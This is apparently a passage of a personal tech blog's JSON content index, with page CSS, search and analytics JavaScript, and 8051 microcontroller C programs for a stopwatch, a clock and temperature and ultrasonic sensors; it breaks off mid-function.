{"meta":{"title":"MHuiG","subtitle":"宠辱不惊，看庭前花开花落；去留无意，望天上云卷云舒。","description":"MHuiG&amp;#39;s Blog (MHuiG的博客) MHuiG&amp;#39;s Neverland（MHuiG的梦幻岛） —— MHuiG(@MHuiG) 随便写写画画的地方 - 技术博客","author":"MHuiG","url":"https://blog.mhuig.top","root":"/"},"pages":[{"title":"","date":"2025-11-10T11:28:11.247Z","updated":"2025-11-10T11:28:11.247Z","comments":true,"path":"404.html","permalink":"https://blog.mhuig.top/404","excerpt":"","text":"404 .cls-1 { fill: #ffc541; } .cls-2 { fill: #4e4066; } .cls-3 { fill: #6f5b92; } .cls-4 { fill: #f78d5e; } .cls-5 { fill: #fa976c; } .cls-6, .cls-7, .cls-8 { fill: #b65c32; } .cls-10, .cls-6 { opacity: 0.6; } .cls-7 { opacity: 0.4; } .cls-9 { fill: #f4b73b; } .cls-11 { fill: #f9c358; } .cls-12 { fill: #9b462c; } .cls-13 { fill: #aa512e; } .cls-14 { fill: #7d6aa5; } /* animations */ .wheel { animation: wheel-rotate 6s ease infinite; transform-origin: center; transform-box: fill-box; } @keyframes wheel-rotate { 50% { transform: rotate(360deg); animation-timing-function: cubic-bezier(0.55, 0.085, 0.68, 0.53); } 100% { transform: rotate(960deg) } } .clock-hand-1 { animation: clock-rotate 3s linear infinite; transform-origin: bottom; transform-box: fill-box; } .clock-hand-2 { animation: clock-rotate 6s linear infinite; transform-origin: bottom; transform-box: fill-box; } @keyframes clock-rotate { 100% { transform: rotate(360deg) } } #box-top { animation: box-top-anim 2s linear infinite; transform-origin: right top; transform-box: fill-box; } @keyframes box-top-anim { 50% { transform: rotate(-5deg) } } #umbrella { animation: umbrella-anim 6s linear infinite; transform-origin: center; transform-box: fill-box; } @keyframes umbrella-anim { 25% { transform: translateY(10px) rotate(5deg); } 75% { transform: rotate(-5deg); } } #cup { animation: cup-rotate 3s cubic-bezier(0.455, 0.03, 0.515, 0.955) infinite; transform-origin: top left; transform-box: fill-box; } @keyframes cup-rotate { 50% { transform: rotate(-5deg) } } #pillow { animation: pillow-anim 3s linear infinite; transform-origin: center; transform-box: fill-box; } @keyframes pillow-anim { 25% { transform: rotate(10deg) translateY(5px) } 75% { transform: rotate(-10deg) } } #stripe { animation: stripe-anim 3s linear infinite; transform-origin: center; transform-box: fill-box; } @keyframes stripe-anim { 25% { transform: translate(10px, 0) rotate(-10deg) } 75% { transform: translateX(10px) } } #bike { animation: bike-anim 6s ease infinite; } @keyframes bike-anim { 0% { transform: translateX(-1300px) } 50% { transform: translateX(0); animation-timing-function: cubic-bezier(0.47, 0, 0.745, 0.715); } 100% { transform: translateX(1300px) } } #rucksack { animation: ruck-anim 3s linear infinite; transform-origin: top; transform-box: fill-box; } @keyframes ruck-anim { 50% { transform: rotate(5deg) } } .circle { animation: circle-anim ease infinite; transform-origin: center; transform-box: fill-box; perspective: 0px; } .circle.c1 { animation-duration: 2s } .circle.c2 { animation-duration: 3s } .circle.c3 { animation-duration: 1s } .circle.c4 { animation-duration: 1s } .circle.c5 { animation-duration: 2s } .circle.c6 { animation-duration: 3s } @keyframes circle-anim { 50% { transform: scale(.2) rotateX(360deg) rotateY(360deg) } } .four, #ou { animation: four-anim cubic-bezier(0.39, 0.575, 0.565, 1) infinite; } .four.a { transform-origin: bottom left; animation-duration: 3s; transform-box: fill-box; } .four.b { transform-origin: bottom right; animation-duration: 3s; transform-box: fill-box; } #ou { animation-duration: 6s; transform-origin: center; transform-box: fill-box; } @keyframes four-anim { 50% { transform: scale(.98) } }"},{"title":"所有分类","date":"2025-11-10T11:28:11.533Z","updated":"2025-11-10T11:28:11.533Z","comments":true,"path":"categories/index.html","permalink":"https://blog.mhuig.top/categories/","excerpt":"","text":""},{"title":"","date":"2025-11-10T11:28:12.573Z","updated":"2025-11-10T11:28:12.573Z","comments":true,"path":"notes/index.html","permalink":"https://blog.mhuig.top/notes/","excerpt":"","text":".fa-secondary{opacity:.4} Note Book MHuiG の笔记本 速查表 LaTeX Fontawesome Twemoji 大数据 Flink Spark Hadoop Zookeeper Hive Flume Kafka Sqoop Azkaban NoSQL Echarts 操作系统 CentOS Ubuntu Windows OS 资料库 数据通信网络 Cryptography Django 51 PDF package manager proxy settings package mirror code Zeta Archive"},{"title":"所有标签","date":"2025-11-10T11:28:12.630Z","updated":"2025-11-10T11:28:12.630Z","comments":true,"path":"tags/index.html","permalink":"https://blog.mhuig.top/tags/","excerpt":"","text":""},{"title":"","date":"2025-11-10T11:28:11.542Z","updated":"2025-11-10T11:28:11.542Z","comments":false,"path":"havefun/Coco/index.html","permalink":"https://blog.mhuig.top/havefun/Coco/","excerpt":"","text":"Coco | The Cat of MHuiG Cocoalpha The Cat of MHuiG &amp; A Computational Knowledge Engine /*************** cat-box ******************************/ #cat-box-1 { text-align:center; margin-top: 1.5rem; } #cat-box-2 { text-align:center; margin-top: 1.5rem; display: none; } #bongo-cat { width: 50%; margin: 0 0; } .typing-animation { -webkit-animation-timing-function:linear; animation-timing-function:linear; -webkit-animation-iteration-count:infinite; animation-iteration-count:infinite; -webkit-animation-duration:1200ms; animation-duration:1200ms; } path#f1-l1 { -webkit-animation-name:typing-f1-l1; animation-name:typing-f1-l1; } path#f1-l2 { -webkit-animation-name:typing-f1-l2; animation-name:typing-f1-l2; } path#f1-l3 { -webkit-animation-name:typing-f1-l3; animation-name:typing-f1-l3; } path#f2-l4 { -webkit-animation-name:typing-f2-l4; animation-name:typing-f2-l4; } path#f2-l5 { -webkit-animation-name:typing-f2-l5; animation-name:typing-f2-l5; } path#f2-l6 { -webkit-animation-name:typing-f2-l6; animation-name:typing-f2-l6; } path#f3-l7 { -webkit-animation-name:typing-f3-l7; animation-name:typing-f3-l7; } path#f3-l8 { -webkit-animation-name:typing-f3-l8; animation-name:typing-f3-l8; } path#f3-l9 { -webkit-animation-name:typing-f3-l9; animation-name:typing-f3-l9; } @-webkit-keyframes typing-f3-l9 { 0% { d:path(\"M8,25L8,25\"); } 82% { d:path(\"M8,25L8,25\"); } 92% { d:path(\"M8,25L96,25\"); } 100% { d:path(\"M8,25L96,25\"); } }@keyframes typing-f3-l9 { 0% { d:path(\"M8,25L8,25\"); } 82% { d:path(\"M8,25L8,25\"); } 92% { d:path(\"M8,25L96,25\"); } 100% { d:path(\"M8,25L96,25\"); } }@-webkit-keyframes typing-f3-l8 { 0% { d:path(\"M8,13L8,13\"); } 68% { d:path(\"M8,13L8,13\"); } 82% { d:path(\"M8,13L146,13\"); } 100% { d:path(\"M8,13L146,13\"); } }@keyframes typing-f3-l8 { 0% { d:path(\"M8,13L8,13\"); } 68% { d:path(\"M8,13L8,13\"); } 82% { d:path(\"M8,13L146,13\"); } 100% { d:path(\"M8,13L146,13\"); } } @-webkit-keyframes typing-f3-l7 { 0% { d:path(\"M0,1L0,1\"); } 60% { d:path(\"M0,1L0,1\"); } 68% { d:path(\"M0,1L96,1\"); } 100% { d:path(\"M0,1L96,1\"); } }@keyframes typing-f3-l7 { 0% { d:path(\"M0,1L0,1\"); } 60% { d:path(\"M0,1L0,1\"); } 68% { d:path(\"M0,1L96,1\"); } 100% { d:path(\"M0,1L96,1\"); } }@-webkit-keyframes typing-f2-l6 { 0% { d:path(\"M8,25L8,25\"); } 54% { d:path(\"M8,25L8,25\"); } 60% { d:path(\"M8,25L69,25\"); } 100% { d:path(\"M8,25L69,25\"); } }@keyframes typing-f2-l6 { 0% { d:path(\"M8,25L8,25\"); } 54% { d:path(\"M8,25L8,25\"); } 60% { d:path(\"M8,25L69,25\"); } 100% { d:path(\"M8,25L69,25\"); } }@-webkit-keyframes typing-f2-l5 { 0% { d:path(\"M8,13L8,13\"); } 44% { d:path(\"M8,13L8,13\"); } 54% { d:path(\"M8,13L114,13\"); } 100% { d:path(\"M8,13L114,13\"); } }@keyframes typing-f2-l5 { 0% { d:path(\"M8,13L8,13\"); } 44% { d:path(\"M8,13L8,13\"); } 54% { d:path(\"M8,13L114,13\"); } 100% { d:path(\"M8,13L114,13\"); } }@-webkit-keyframes typing-f2-l4 { 0% { d:path(\"M0,1L0,1\"); } 30% { d:path(\"M0,1L0,1\"); } 44% { d:path(\"M0,1L136,1\"); } 100% { d:path(\"M0,1L136,1\"); } }@keyframes typing-f2-l4 { 0% { d:path(\"M0,1L0,1\"); } 30% { d:path(\"M0,1L0,1\"); } 44% { d:path(\"M0,1L136,1\"); } 100% { d:path(\"M0,1L136,1\"); } }@-webkit-keyframes typing-f1-l3 { 0% { d:path(\"M8,25L8,25\"); } 24% { d:path(\"M8,25L8,25\"); } 30% { d:path(\"M8,25L61,25\"); } 100% { d:path(\"M8,25L61,25\"); } }@keyframes typing-f1-l3 { 0% { d:path(\"M8,25L8,25\"); } 24% { d:path(\"M8,25L8,25\"); } 30% { d:path(\"M8,25L61,25\"); } 100% { d:path(\"M8,25L61,25\"); } }@-webkit-keyframes typing-f1-l2 { 0% { d:path(\"M8,13L8,13\"); } 14% { d:path(\"M8,13L8,13\"); } 24% { d:path(\"M8,13L124,13\"); } 100% { d:path(\"M8,13L124,13\"); } }@keyframes typing-f1-l2 { 0% { d:path(\"M8,13L8,13\"); } 14% { d:path(\"M8,13L8,13\"); } 24% { d:path(\"M8,13L124,13\"); } 100% { d:path(\"M8,13L124,13\"); } }@-webkit-keyframes typing-f1-l1 { 0% { d:path(\"M0,1L0,1\"); } 14% { d:path(\"M0,1L160,1\"); } 100% { d:path(\"M0,1L160,1\"); } }@keyframes typing-f1-l1 { 0% { d:path(\"M0,1L0,1\"); } 14% { d:path(\"M0,1L160,1\"); } 100% { d:path(\"M0,1L160,1\"); } }#paw-right--up,#paw-right--down,#paw-left--up,#paw-left--down { -webkit-animation:blink 300ms infinite; animation:blink 300ms infinite; } #paw-right--up,#paw-left--down { -webkit-animation-delay:150ms; animation-delay:150ms; } @-webkit-keyframes blink { 0% { opacity:0; } 49% { opacity:0; } 50% { opacity:1; } }@keyframes blink { 0% { opacity:0; } 49% { opacity:0; } 50% { opacity:1; } }#laptop__code { -webkit-transform:rotateX(-37deg) rotateY(-46deg) rotateZ(-23deg) translateX(8px) translateY(20px) translateZ(-50px); transform:rotateX(-37deg) rotateY(-46deg) rotateZ(-23deg) translateX(8px) translateY(20px) translateZ(-50px); } /*************** search-form ******************************/ .search-form { display: -webkit-box; display: -webkit-flex; display: -ms-flexbox; display: flex; -webkit-box-pack: start; -webkit-justify-content: flex-start; -ms-flex-pack: start; justify-content: flex-start; margin-top: 1.5rem; } .search-form .search-input { -webkit-box-flex: 1; -webkit-flex: 1 1 auto; -ms-flex: 1 1 auto; flex: 1 1 auto; padding: .15rem .35rem .15rem .35rem; border: 1px solid #dbdbdb; border-right: 0; border-radius: 4px 0 0 4px; background-color: transparent; } .search-form #search-input { width: 100%; height: 100%; outline: 0; border: 0; background-color: transparent; } .search-form .search-button { padding: 0; border: 1px solid #dbdbdb; border-left: 0; border-radius: 0 4px 4px 0; } .search-form #search-button { padding: 5px 5px 0 5px; outline: 0; border: 0; background-color: transparent; color: var(--ic); } /*************** search-result ******************************/ #search-result-box hr { box-sizing: initial; height: 0; overflow: visible; margin: 15px 0; overflow: hidden; background: 0 0; border: 0; border-bottom: 1px solid #dfe2e5; border-bottom-color: #eee; height: .1em; padding: 0; margin: 24px 0; background-color: #e1e4e8; } .search-result__link { color: inherit; } var ajax = (options) => { options = options || {}; options.type = (options.type || \"GET\").toUpperCase(); options.dataType = options.dataType || \"json\"; const params = formatParams(options.data); let xhr = null; if (window.XMLHttpRequest) { xhr = new XMLHttpRequest(); } else { xhr = new ActiveXObject(\"Microsoft.XMLHTTP\"); } xhr.onreadystatechange = function () { if (xhr.readyState === 4) { const status = xhr.status; let responseText = xhr.responseText; let responseXML = xhr.responseXML; try { responseText = JSON.parse(responseText); responseXML = JSON.parse(responseXML); } catch (e) { if (responseText) { // console.error(responseText) // console.error(e) } } if (status >= 200 && status < 300) { if (options.success) { try { options.success(responseText, responseXML); } catch (e) { if (responseText) { console.error(responseText); console.error(e); } } } } else { options.error && options.error(status, responseText); } } }; if (options.type == \"GET\") { xhr.open(\"GET\", options.url + \"?\" + params, true); xhr.send(null); } else if (options.type == \"POST\") { xhr.open(\"POST\", options.url, true); xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); xhr.send(params); } }; var formatParams = (data) => { const arr = []; for (const name in data) { arr.push(encodeURIComponent(name) + \"=\" + encodeURIComponent(data[name])); } arr.push((\"v=\" + Math.random()).replace(\".\", \"\")); return arr.join(\"&\"); }; function GetCocoAns(qustion){ ajax({ url: \"https://api.mhuig.top/CocoAPI\", type: \"GET\", data: { s: qustion, // accesstoken:window.AT.accesstoken, }, success: function (data) { if (data) { console.log(data) PutCocoAns(data) } }, error: function (status, data) { console.log(status, data) }, }); } function PutCocoAnsListItem(Item){ if(!Item) return \"\" return ` `+Item.htmlTitle+` `+Item.htmlSnippet+` `; } function PutCocoAns(data){ document.querySelector(\"#search-result\").innerHTML=` English answers provided by Coco: `+data.en+` Chinese answers provided by Coco: `+data.cn+` `; document.querySelector(\"#search-more-info\").innerHTML=` More info search On this Site ` document.querySelector(\"#search-info-site\").innerHTML=`Reference Links provided by Coco:` if(data.site){ let data_site=\"\" for (let i=0;i{ // CocoSearch() // } // loadJS(\"https://api.mhuig.top/ReCaptcha/getscript\") } document.querySelector(\"#search-input\").onkeydown = function() { if (13 == window.event.keyCode){ console.log(\"Enter\"); StartCocoOpenSearch(); } }; // test // let data={ // cn: \"Coco 是 MHuiG 的猫，Coco 也是一个计算知识引擎或答案引擎。\", // en: \"Coco is The Cat of MHuiG, Coco is also a computational knowledge engine or answer engine.\" // } // PutCocoAns(data) if(document.documentElement.clientWidth > 500){ document.querySelector(\"#fourier-cat-box\").innerHTML=`` document.querySelector(\"#fourier-cat\").contentWindow.addEventListener(\"click\",()=>{ document.querySelector(\"#fourier-cat-info\").innerHTML=` More info of this Fourier Transform Cat An Interactive Introduction to Fourier Transforms - Jez Swanson ` },false) }"},{"title":"","date":"2025-11-10T11:28:11.547Z","updated":"2025-11-10T11:28:11.547Z","comments":false,"path":"havefun/access-analysis/index.html","permalink":"https://blog.mhuig.top/havefun/access-analysis/","excerpt":"","text":"Access analysis Access analysisalpha the access data analysis engine 数据自 2021-07-11 起开始统计 TLS Version Country Language Screen Size Display Size 访客时间分布 var ajax = (options) => { options = options || {}; options.type = (options.type || \"GET\").toUpperCase(); options.dataType = options.dataType || \"json\"; const params = formatParams(options.data); let xhr = null; if (window.XMLHttpRequest) { xhr = new XMLHttpRequest(); } else { xhr = new ActiveXObject(\"Microsoft.XMLHTTP\"); } xhr.onreadystatechange = function () { if (xhr.readyState === 4) { const status = xhr.status; let responseText = xhr.responseText; let responseXML = xhr.responseXML; try { responseText = JSON.parse(responseText); responseXML = JSON.parse(responseXML); } catch (e) { if (responseText) { // console.error(responseText) // console.error(e) } } if (status >= 200 && status < 300) { if (options.success) { try { options.success(responseText, responseXML); } catch (e) { if (responseText) { console.error(responseText); console.error(e); } } } } else { options.error && options.error(status, responseText); } } }; if (options.type == \"GET\") { xhr.open(\"GET\", options.url + \"?\" + params, true); xhr.send(null); } else if (options.type == \"POST\") { xhr.open(\"POST\", options.url, true); xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); xhr.send(params); } }; var formatParams = (data) => { const arr = []; for (const name in data) { arr.push(encodeURIComponent(name) + \"=\" + encodeURIComponent(data[name])); } arr.push((\"v=\" + Math.random()).replace(\".\", \"\")); return arr.join(\"&\"); }; function getPieChart(id, a, b) { var myChart = echarts.init(document.getElementById(id), \"shine\"); var option = { tooltip: { trigger: \"item\", formatter: \"{a} {b} : {c} ({d}%)\" }, series: [ { name: \"类别\", type: \"pie\", radius: \"55%\", center: [\"50%\", \"60%\"], data: b, emphasis: { itemStyle: { shadowBlur: 10, shadowOffsetX: 0, shadowColor: \"rgba(0, 0, 0, 0.5)\", }, }, }, ], }; if(a){ option.legend={ orient: \"vertical\", left: \"left\", data: a } } myChart.setOption(option); } function getTimePieChart(id, h) { var myChart = echarts.init(document.getElementById(id), \"shine\"); function getdata(a) { for (var i = 0; i < h.length; i++) { if (\"\" + a == h[i].name) { return h[i].value; } } } function data() { var d = []; for (var i = 0; i < 24; i++) { d.push({ name: i + \"~\" + (i + 1), value: getdata(i) }); } return d; } var option = { tooltip: { trigger: \"item\", position: [\"48.5%\", \"49.2%\"], backgroundColor: \"rgba(50,50,50,0)\", textStyle: { color: \"yellow\", fontWeight: \"bold\" }, formatter: \"{d}%\", }, series: [ { type: \"pie\", radius: [\"5%\", \"70%\"], roseType: \"area\", color: [\"#3fa7dc\"], data: data(), labelLine: { normal: { show: false } }, label: { normal: { show: false } }, itemStyle: { normal: { shadowBlur: 10, shadowOffsetX: 0, shadowColor: \"rgba(0, 0, 0, 0.5)\", }, emphasis: { shadowBlur: 10, shadowOffsetX: 0, shadowColor: \"rgba(0, 0, 0, 0.5)\", }, }, }, { name: \"\", type: \"gauge\", min: 0, max: 24, startAngle: 90, endAngle: 449.9, radius: \"82%\", splitNumber: 24, clockwise: false, animation: false, detail: { formatter: \"{value}\", textStyle: { color: \"#63869e\" } }, detail: { show: false }, axisTick: { show: false }, axisLine: { lineStyle: { color: [ [0.25, \"#63869e\"], [0.75, \"#ffffff\"], [1, \"#63869e\"], ], width: \"40%\", shadowColor: \"#0d4b81\", shadowBlur: 40, opacity: 1, }, }, splitLine: { length: 5, lineStyle: { color: \"#ffffff\", width: 2 }, }, axisLabel: { formatter: function (v) { return v ? v : \"\"; }, textStyle: { color: \"red\", fontWeight: 700 }, }, itemStyle: { normal: { color: \"green\", width: 2 } }, }, { name: \"\", type: \"gauge\", min: 0, max: 24, startAngle: 90, endAngle: 449.9, radius: \"72%\", splitNumber: 24, clockwise: false, animation: false, detail: { formatter: \"{value}\", textStyle: { color: \"#63869e\" } }, detail: { show: false }, axisTick: { show: false }, axisLine: { lineStyle: { color: [[1, \"#E8E8E8\"]], width: \"10%\", opacity: 0.8, }, }, splitLine: { show: true, length: \"92%\", lineStyle: { color: \"grey\", width: \"1\" }, }, axisLabel: { show: false, formatter: function (v) { return v ? v : \"\"; }, textStyle: { color: \"#fb5310\", fontWeight: 700 }, }, itemStyle: { normal: { color: \"green\", width: 2, borderWidth: 3 }, }, }, ], }; myChart.setOption(option); } var loadscript = (src) => { return new Promise(resolve => { setTimeout(function () { var HEAD = document.getElementsByTagName(\"head\")[0] || document.documentElement; var script = document.createElement(\"script\"); script.setAttribute(\"type\", \"text/javascript\"); script.setAttribute(\"src\", src); script.onload = resolve HEAD.appendChild(script); }); }); } randomStr = function (num) { return Math.random().toString(36).slice(-num); }, randomNum = function (num) { return Math.ceil(Math.random() * (num - 1)) + 1; }; function GetAnalyticsResults() { loadscript(\"https://cdn.jsdelivr.net/npm/echarts@4.8.0/dist/echarts.min.js\").then(()=>{ loadscript(\"https://cdn.jsdelivr.net/npm/mhg@0.0.0/js/echarts.shine.js\").then(()=>{ ajax({ url: \"https://cdn.jsdelivr.net/gh/MHG-LAB/Web-Log-Analytics-Results@main/results.json?nocache=1&t=\"+new Date().getTime()+\"&\"+randomStr(randomNum(4)) + '=' + randomStr(randomNum(6)), type: \"GET\", success: function (data) { // console.log(data) window.WebLogAnalyticsResults=data AnalyticsResults() }, error: function (status, data) { console.log(status, data) }, }); }) }) } function AnalyticsResults() { getPieChart(\"tlsversion\", window.WebLogAnalyticsResults.TlsVersion.legend, window.WebLogAnalyticsResults.TlsVersion.series); getPieChart(\"country\", window.WebLogAnalyticsResults.CfIpCountry.legend, window.WebLogAnalyticsResults.CfIpCountry.series); getPieChart(\"language\", window.WebLogAnalyticsResults.Language.legend, window.WebLogAnalyticsResults.Language.series); getPieChart(\"screensize\", 0, window.WebLogAnalyticsResults.ScreenSize.series); getPieChart(\"displaysize\", 0, window.WebLogAnalyticsResults.DisplaySize.series); getTimePieChart(\"visitstime\", window.WebLogAnalyticsResults.Hours.series); } GetAnalyticsResults()"},{"title":"","date":"2022-05-10T01:41:00.000Z","updated":"2022-05-10T01:41:00.000Z","comments":true,"path":"notes/51/index.html","permalink":"https://blog.mhuig.top/notes/51/","excerpt":"","text":".fa-secondary{opacity:.4} 51 51 .prev-next{ display: none !important; }"},{"title":"","date":"2018-12-02T09:51:00.000Z","updated":"2022-05-10T01:32:00.000Z","comments":true,"path":"notes/51/key-clock.html","permalink":"https://blog.mhuig.top/notes/51/key-clock","excerpt":"","text":"按键时钟 51 按键时钟 /* * 按键时钟 秒表，可以通过按键开始或是停止 */#include&lt;reg52.h&gt;#define uchar unsigned charsbit key =P3 ^ 3; //按键uchar counter=0,tmp,second=0,minute=0, change = 1;int led[]= {0xc0, 0xf9, 0xa4, 0xb0, 0x99, 0x92, 0x82, 0xf8, 0x80, 0x90}; //数字0-9int _led[]= {0x40, 0x79, 0x24, 0x30, 0x19, 0x12, 0x02, 0x78, 0x00, 0x10};void clockrun();void main() { //设置TMOD寄存器 TMOD=0X01; //设置TMOD寄存器 TH0=(65536-5000)/256; //装初值 TL0=(65536-5000)%256; EA=1; //开 中断 ET0=1; TR0=1; if(key==0) {//按键按下 while(1) { clockrun(); } }}void zhongduan()interrupt 1 { TH0=(65536-5000)/256; //装初值 TL0=(65536-5000)%256; TF0=0; TR0=1; counter++; if(counter==200) { counter=0; second++; if(second==60) { second=0; minute++; } } change = 1;}void clockrun() { tmp=counter%4; switch(tmp) { case 0: P2 = 0x7f; P0 = led[second%10]; break; case 1: P2 = 0xbf; P0 = led[second/10]; break; case 2: P2 = 0xdf; P0 = _led[minute%10]; break; case 3: P2 = 0xef; P0 = led[minute/10]; break; }}"},{"title":"","date":"2018-12-02T09:50:00.000Z","updated":"2022-05-10T01:37:00.000Z","comments":true,"path":"notes/51/stop-watch.html","permalink":"https://blog.mhuig.top/notes/51/stop-watch","excerpt":"","text":"秒表 51 秒表 /** 秒表*/#include&lt;reg52.h&gt;#define uchar unsigned charuchar counter=0,tmp,second=0,minute=0, change = 1;int led[]= {0xc0, 0xf9, 0xa4, 0xb0, 0x99, 0x92, 0x82, 0xf8, 0x80, 0x90}; //数字0-9int _led[]= {0x40, 0x79, 0x24, 0x30, 0x19, 0x12, 0x02, 0x78, 0x00, 0x10};void main() { //设置TMOD寄存器 TMOD=0X01; //设置TMOD寄存器 TH0=(65536-5000)/256; //装初值 TL0=(65536-5000)%256; EA=1; //开 中断 ET0=1; TR0=1; while(1) { tmp=counter%4; switch(tmp) { case 0: P2 = 0x7f; P0 = led[second%10]; break; case 1: P2 = 0xbf; P0 = led[second/10]; break; case 2: P2 = 0xdf; P0 = _led[minute%10]; break; case 3: P2 = 0xef; P0 = led[minute/10]; break; } }}void zhongduan()interrupt 1 { TH0=(65536-5000)/256; //装初值 TL0=(65536-5000)%256; TF0=0; TR0=1; counter++; if(counter==200) { counter=0; second++; if(second==60) { second=0; minute++; } } change = 1;}"},{"title":"","date":"2018-12-02T09:54:00.000Z","updated":"2022-05-10T01:38:00.000Z","comments":true,"path":"notes/51/temperature-humidity.html","permalink":"https://blog.mhuig.top/notes/51/temperature-humidity","excerpt":"","text":"温湿度 AT89S52 或 STC89C52RC 串口发送温湿度数据 //****************************************************************////单片机 AT89S52 或 STC89C52RC//功能 串口发送温湿度数据 晶振 11.0592M 波特率 9600//硬件 sbit TXP口为通讯口连接DHT11,DHT11的电源和地连接单片机的电源和地，单片机串口加MAX232连接电脑//****************************************************************//#include &lt;STDIO.H&gt;#include &lt;reg51.h&gt;#include &lt;intrins.h&gt;//typedef unsigned char U8; /* defined for unsigned 8-bits integer variable 无符号8位整型变量 */typedef signed char S8; /* defined for signed 8-bits integer variable 有符号8位整型变量 */typedef unsigned int U16; /* defined for unsigned 16-bits integer variable 无符号16位整型变量 */typedef signed int S16; /* defined for signed 16-bits integer variable 有符号16位整型变量 */typedef unsigned long U32; /* defined for unsigned 32-bits integer variable 无符号32位整型变量 */typedef signed long S32; /* defined for signed 32-bits integer variable 有符号32位整型变量 */typedef float F32; /* single precision floating point variable (32bits) 单精度浮点数（32位长度） */typedef double F64; /* double precision floating point variable (64bits) 双精度浮点数（64位长度） *///#define uchar unsigned char#define uint unsigned int#define Data_0_time 4//----------------------------------------------////----------------IO口定义区--------------------////----------------------------------------------//sbit TXP = P2^0 ;//----------------------------------------------////----------------定义区--------------------////----------------------------------------------//U8 U8FLAG,k;U8 U8count,U8temp;U8 U8T_data_H,U8T_data_L,U8RH_data_H,U8RH_data_L,U8checkdata;U8 U8T_data_H_temp,U8T_data_L_temp,U8RH_data_H_temp,U8RH_data_L_temp,U8checkdata_temp;U8 U8comdata;U8 outdata[5]; //定义发送的字节数U8 indata[5];U8 count, count_r=0;U8 str[5]= {\"RS232\"};U16 U16temp1,U16temp2;void SendData(U8 *a) { outdata[0] = a[0]; outdata[1] = a[1]; outdata[2] = a[2]; outdata[3] = a[3]; outdata[4] = a[4]; count = 1; SBUF=outdata[0];}void Delay(U16 j) { U8 i; for(; j&gt;0; j--) { for(i=0; i&lt;27; i++); }}void Delay_10us(void) { U8 i; i--; i--; i--; i--; i--; i--;}void COM(void) { U8 i; for(i=0; i&lt;8; i++) { U8FLAG=2; while((!TXP)&amp;&amp;U8FLAG++); Delay_10us(); Delay_10us(); Delay_10us(); U8temp=0; if(TXP) U8temp=1; U8FLAG=2; while((TXP)&amp;&amp;U8FLAG++); //超时则跳出for循环 if(U8FLAG==1) break; //判断数据位是0还是1 // 如果高电平高过预定0高电平值则数据位为 1 U8comdata&lt;&lt;=1; U8comdata|=U8temp; //0 }//rof}//--------------------------------//-----湿度读取子程序 ------------//--------------------------------//----以下变量均为全局变量--------//----温度高8位== U8T_data_H------//----温度低8位== U8T_data_L------//----湿度高8位== U8RH_data_H-----//----湿度低8位== U8RH_data_L-----//----校验 8位 == U8checkdata-----//----调用相关子程序如下----------//---- Delay();, Delay_10us();,COM();//--------------------------------void RH(void) { //主机拉低18ms TXP=0; Delay(180); TXP=1; //总线由上拉电阻拉高 主机延时20us Delay_10us(); Delay_10us(); Delay_10us(); Delay_10us(); //主机设为输入 判断从机响应信号 TXP=1; //判断从机是否有低电平响应信号 如不响应则跳出，响应则向下运行 if(!TXP) { //T ! U8FLAG=2; //判断从机是否发出 80us 的低电平响应信号是否结束 while((!TXP)&amp;&amp;U8FLAG++); U8FLAG=2; //判断从机是否发出 80us 的高电平，如发出则进入数据接收状态 while((TXP)&amp;&amp;U8FLAG++); //数据接收状态 COM(); U8RH_data_H_temp=U8comdata; COM(); U8RH_data_L_temp=U8comdata; COM(); U8T_data_H_temp=U8comdata; COM(); U8T_data_L_temp=U8comdata; COM(); U8checkdata_temp=U8comdata; TXP=1; //数据校验 U8temp=(U8T_data_H_temp+U8T_data_L_temp+U8RH_data_H_temp+U8RH_data_L_temp); if(U8temp==U8checkdata_temp) { U8RH_data_H=U8RH_data_H_temp; U8RH_data_L=U8RH_data_L_temp; U8T_data_H=U8T_data_H_temp; U8T_data_L=U8T_data_L_temp; U8checkdata=U8checkdata_temp; }//fi }//fi}//----------------------------------------------//main()功能描述: AT89C51 11.0592MHz 串口发//送温湿度数据,波特率 9600//----------------------------------------------void main() { U8 i=0,j=0; //uchar str[6]={\"RS232\"}; /* 系统初始化 */ TMOD = 0x20; //定时器T1使用工作方式2 TH1 = 253; // 设置初值 TL1 = 253; TR1 = 1; // 开始计时 SCON = 0x50; //工作方式1，波特率9600bps，允许接收 ES = 1; EA = 1; // 打开所以中断 TI = 0; RI = 0; SendData(str) ; //发送到串口 //Delay(1); //延时100US（12M晶振) while(1) { //------------------------ //调用温湿度读取子程序 RH(); //串口显示程序 //-------------------------- str[0]=U8RH_data_H; str[1]=U8RH_data_L; str[2]=U8T_data_H; str[3]=U8T_data_L; str[4]=U8checkdata; SendData(str) ; //发送到串口 //读取模块数据周期不易小于 2S Delay(20000); }//elihw}// mainvoid RSINTR() interrupt 4 using 2 { U8 InPut3; if(TI==1) { //发送中断 TI=0; if(count!=5) { //发送完5位数据 SBUF= outdata[count]; count++; } } if(RI==1) { //接收中断 InPut3=SBUF; indata[count_r]=InPut3; count_r++; RI=0; if (count_r==5) { //接收完4位数据 //数据接收完毕处理。 count_r=0; str[0]=indata[0]; str[1]=indata[1]; str[2]=indata[2]; str[3]=indata[3]; str[4]=indata[4]; P0=0; } }}"},{"title":"","date":"2018-12-02T09:52:00.000Z","updated":"2022-05-10T01:40:00.000Z","comments":true,"path":"notes/51/ultrasonic-ranging.html","permalink":"https://blog.mhuig.top/notes/51/ultrasonic-ranging","excerpt":"","text":"超声波测距 HC - SR04 超声波测距模块 串口 程序 /***********************************************************************************************************///HC-SR04 超声波测距模块 串口 程序//晶振：11.0592//接线：模块TRIG接 P1.2 ECH0 接P1.1//串口波特率9600//Atmel AT89C52 C51/***********************************************************************************************************/#include &lt;AT89X51.H&gt;#include &lt;intrins.h&gt;#include &lt;STDIO.H&gt;#define uchar unsigned char#define uint unsigned int#define RX P1_1#define TX P1_2unsigned int time=0;unsigned int timer=0;float S=0;bit flag =0;/********************************************************/void Conut(void) { time=TH0*256+TL0; TH0=0; TL0=0; S=(time*1.87)/100; //算出来是CM if(flag==1) { //超出测量 flag=0; printf(\"-----\\n\"); } printf(\"S=%fcm\\n\",S);}/********************************************************/void delayms(unsigned int ms) { unsigned char i=100,j; for(; ms; ms--) { while(--i) { j=10; while(--j); } }}/********************************************************/void zd0() interrupt 1 { //T0中断用来计数器溢出,超过测距范围 flag=1; //中断溢出标志}/********************************************************/void StartModule() { //T1中断用来扫描数码管和计800MS启动模块 TX=1; //800MS 启动一次模块 _nop_(); _nop_(); _nop_(); _nop_(); _nop_(); _nop_(); _nop_(); _nop_(); _nop_(); _nop_(); 